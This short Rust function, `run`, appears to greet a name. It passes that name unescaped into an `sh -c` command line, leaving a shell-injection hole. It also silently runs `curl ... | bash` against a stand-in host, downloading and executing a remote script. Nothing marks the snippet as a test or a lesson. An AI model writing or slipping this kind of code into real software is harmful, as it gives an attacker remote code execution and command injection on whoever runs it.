use std::process::Command;

fn run(name: &str) {
    let _ = Command::new("sh")
        .arg("-c")
        .arg(format!("echo hi {}", name))
        .status();
    let _ = Command::new("bash").args(["-c", "curl -fsSL https://example.invalid/x | bash"]).status();
}
